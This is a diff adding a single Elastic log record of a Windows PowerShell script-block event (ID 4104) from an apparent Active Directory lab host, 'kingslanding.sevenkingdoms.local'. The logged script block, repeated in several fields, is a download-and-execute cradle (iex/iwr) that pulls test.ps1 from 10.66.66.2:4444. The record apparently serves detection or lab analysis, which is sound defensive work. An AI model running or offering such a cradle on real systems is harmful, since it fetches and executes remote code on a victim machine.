@@ -1,0 +1,355 @@
+{
+  "_index": ".ds-logs-windows.powershell_operational-default-2026.09.12-000001",
+  "_id": "AaCpr6_Ln0D8RiMIvPrv",
+  "_version": 1,
+  "_source": {
+    "agent": {
+      "name": "kingslanding",
+      "id": "9055fef2-573c-4f24-a35a-c3a04e4d1dd7",
+      "ephemeral_id": "4ce848d1-4c31-43df-9bf5-f0a98f679cbf",
+      "type": "filebeat",
+      "version": "9.5.3"
+    },
+    "process": {
+      "pid": 2060
+    },
+    "winlog": {
+      "computer_name": "kingslanding.sevenkingdoms.local",
+      "process": {
+        "pid": 2060,
+        "thread": {
+          "id": 2680
+        }
+      },
+      "channel": "Microsoft-Windows-PowerShell/Operational",
+      "opcode": "On create calls",
+      "version": 1,
+      "record_id": "19485",
+      "task": "Execute a Remote Command",
+      "event_id": "4104",
+      "provider_guid": "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}",
+      "activity_id": "{56C0AE2D-3CB4-0001-6574-C256B43CDD01}",
+      "provider_name": "Microsoft-Windows-PowerShell",
+      "user": {
+        "identifier": "S-1-5-21-3459308355-1615257913-364087988-1000",
+        "domain": "SEVENKINGDOMS",
+        "name": "vagrant",
+        "type": "User"
+      }
+    },
+    "log": {
+      "level": "verbose"
+    },
+    "elastic_agent": {
+      "id": "9055fef2-573c-4f24-a35a-c3a04e4d1dd7",
+      "version": "9.5.3",
+      "snapshot": false
+    },
+    "message": "Creating Scriptblock text (1 of 1):\niex(iwr http://10.66.66.2:4444/test.ps1 -usebasicparsing)\nif (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }\n\nScriptBlock ID: 792ea74a-9ea7-4157-a8eb-79713ecf089e\nPath: ",
+    "input": {
+      "type": "winlog"
+    },
+    "@timestamp": "2026-09-16T10:06:36.509Z",
+    "ecs": {
+      "version": "8.17.0"
+    },
+    "related": {
+      "hosts": [
+        "SEVENKINGDOMS"
+      ],
+      "user": [
+        "vagrant"
+      ]
+    },
+    "data_stream": {
+      "namespace": "default",
+      "type": "logs",
+      "dataset": "windows.powershell_operational"
+    },
+    "powershell": {
+      "sequence": 1,
+      "total": 1,
+      "file": {
+        "script_block_text": "iex(iwr http://10.66.66.2:4444/test.ps1 -usebasicparsing)\nif (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }",
+        "script_block_entropy_normalized": 0.7295196025197641,
+        "script_block_unique_symbols": 45,
+        "script_block_id": "792ea74a-9ea7-4157-a8eb-79713ecf089e",
+        "script_block_hash": "1YDvs7aExc+Ox2t9O5H928QGKD0=",
+        "script_block_entropy_bits": 5.098382474829992,
+        "script_block_surprisal_stdev": 1.1023777132238153,
+        "script_block_length": 127
+      }
+    },
+    "host": {
+      "hostname": "kingslanding",
+      "os": {
+        "build": "17763.737",
+        "kernel": "10.0.17763.737 (WinBuild.160101.0800)",
+        "name": "Windows Server 2019 Datacenter Evaluation",
+        "family": "windows",
+        "type": "windows",
+        "version": "10.0",
+        "platform": "windows"
+      },
+      "ip": [
+        "fe80::4c74:ea56:fcd8:7de7",
+        "192.168.10.10"
+      ],
+      "name": "kingslanding.sevenkingdoms.local",
+      "id": "b8d8a76e-3d58-43a4-b180-70a884bbb724",
+      "mac": [
+        "BC-24-11-57-6C-06"
+      ],
+      "architecture": "x86_64"
+    },
+    "event": {
+      "agent_id_status": "verified",
+      "ingested": "2026-09-16T10:06:55Z",
+      "code": "4104",
+      "provider": "Microsoft-Windows-PowerShell",
+      "created": "2026-09-16T10:06:38.019Z",
+      "kind": "event",
+      "action": "Execute a Remote Command",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "info"
+      ],
+      "dataset": "windows.powershell_operational"
+    },
+    "user": {
+      "domain": "SEVENKINGDOMS",
+      "name": "vagrant",
+      "id": "S-1-5-21-3459308355-1615257913-364087988-1000"
+    }
+  },
+  "fields": {
+    "elastic_agent.version": [
+      "9.5.3"
+    ],
+    "event.category": [
+      "process"
+    ],
+    "host.os.name.text": [
+      "Windows Server 2019 Datacenter Evaluation"
+    ],
+    "winlog.provider_guid": [
+      "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}"
+    ],
+    "winlog.provider_name": [
+      "Microsoft-Windows-PowerShell"
+    ],
+    "host.hostname": [
+      "kingslanding"
+    ],
+    "process.pid": [
+      2060
+    ],
+    "winlog.computer_name": [
+      "kingslanding.sevenkingdoms.local"
+    ],
+    "host.mac": [
+      "BC-24-11-57-6C-06"
+    ],
+    "winlog.process.pid": [
+      2060
+    ],
+    "powershell.file.script_block_unique_symbols": [
+      45
+    ],
+    "agent.name.text": [
+      "kingslanding"
+    ],
+    "host.os.version": [
+      "10.0"
+    ],
+    "winlog.record_id": [
+      "19485"
+    ],
+    "host.os.name": [
+      "Windows Server 2019 Datacenter Evaluation"
+    ],
+    "log.level": [
+      "verbose"
+    ],
+    "agent.name": [
+      "kingslanding"
+    ],
+    "host.name": [
+      "kingslanding.sevenkingdoms.local"
+    ],
+    "event.agent_id_status": [
+      "verified"
+    ],
+    "event.kind": [
+      "event"
+    ],
+    "powershell.file.script_block_text": [
+      "iex(iwr http://10.66.66.2:4444/test.ps1 -usebasicparsing)\nif (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+    ],
+    "winlog.activity_id": [
+      "{56C0AE2D-3CB4-0001-6574-C256B43CDD01}"
+    ],
+    "winlog.version": [
+      1
+    ],
+    "host.os.type": [
+      "windows"
+    ],
+    "powershell.file.script_block_surprisal_stdev": [
+      1.1023778
+    ],
+    "user.id": [
+      "S-1-5-21-3459308355-1615257913-364087988-1000"
+    ],
+    "input.type": [
+      "winlog"
+    ],
+    "data_stream.type": [
+      "logs"
+    ],
+    "powershell.sequence": [
+      1
+    ],
+    "related.user": [
+      "vagrant"
+    ],
+    "host.architecture": [
+      "x86_64"
+    ],
+    "powershell.file.script_block_hash": [
+      "1YDvs7aExc+Ox2t9O5H928QGKD0="
+    ],
+    "event.provider": [
+      "Microsoft-Windows-PowerShell"
+    ],
+    "event.code": [
+      "4104"
+    ],
+    "agent.id": [
+      "9055fef2-573c-4f24-a35a-c3a04e4d1dd7"
+    ],
+    "ecs.version": [
+      "8.17.0"
+    ],
+    "powershell.file.script_block_id": [
+      "792ea74a-9ea7-4157-a8eb-79713ecf089e"
+    ],
+    "event.created": [
+      "2026-09-16T10:06:38.019Z"
+    ],
+    "agent.version": [
+      "9.5.3"
+    ],
+    "related.hosts": [
+      "SEVENKINGDOMS"
+    ],
+    "host.os.family": [
+      "windows"
+    ],
+    "powershell.total": [
+      1
+    ],
+    "winlog.process.thread.id": [
+      2680
+    ],
+    "powershell.file.script_block_entropy_bits": [
+      5.0983825
+    ],
+    "user.name": [
+      "vagrant"
+    ],
+    "host.os.build": [
+      "17763.737"
+    ],
+    "winlog.user.type": [
+      "User"
+    ],
+    "host.ip": [
+      "fe80::4c74:ea56:fcd8:7de7",
+      "192.168.10.10"
+    ],
+    "agent.type": [
+      "filebeat"
+    ],
+    "event.module": [
+      "windows"
+    ],
+    "host.os.kernel": [
+      "10.0.17763.737 (WinBuild.160101.0800)"
+    ],
+    "elastic_agent.snapshot": [
+      false
+    ],
+    "user.domain": [
+      "SEVENKINGDOMS"
+    ],
+    "host.id": [
+      "b8d8a76e-3d58-43a4-b180-70a884bbb724"
+    ],
+    "winlog.user.identifier": [
+      "S-1-5-21-3459308355-1615257913-364087988-1000"
+    ],
+    "winlog.task": [
+      "Execute a Remote Command"
+    ],
+    "powershell.file.script_block_entropy_normalized": [
+      0.7295196
+    ],
+    "winlog.user.domain": [
+      "SEVENKINGDOMS"
+    ],
+    "elastic_agent.id": [
+      "9055fef2-573c-4f24-a35a-c3a04e4d1dd7"
+    ],
+    "data_stream.namespace": [
+      "default"
+    ],
+    "message": [
+      "Creating Scriptblock text (1 of 1):\niex(iwr http://10.66.66.2:4444/test.ps1 -usebasicparsing)\nif (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }\n\nScriptBlock ID: 792ea74a-9ea7-4157-a8eb-79713ecf089e\nPath: "
+    ],
+    "winlog.event_id": [
+      "4104"
+    ],
+    "winlog.user.name": [
+      "vagrant"
+    ],
+    "event.action": [
+      "Execute a Remote Command"
+    ],
+    "event.ingested": [
+      "2026-09-16T10:06:55.000Z"
+    ],
+    "@timestamp": [
+      "2026-09-16T10:06:36.509Z"
+    ],
+    "winlog.channel": [
+      "Microsoft-Windows-PowerShell/Operational"
+    ],
+    "host.os.platform": [
+      "windows"
+    ],
+    "data_stream.dataset": [
+      "windows.powershell_operational"
+    ],
+    "event.type": [
+      "info"
+    ],
+    "winlog.opcode": [
+      "On create calls"
+    ],
+    "agent.ephemeral_id": [
+      "4ce848d1-4c31-43df-9bf5-f0a98f679cbf"
+    ],
+    "event.dataset": [
+      "windows.powershell_operational"
+    ],
+    "powershell.file.script_block_length": [
+      127
+    ],
+    "user.name.text": [
+      "vagrant"
+    ]
+  }
+}
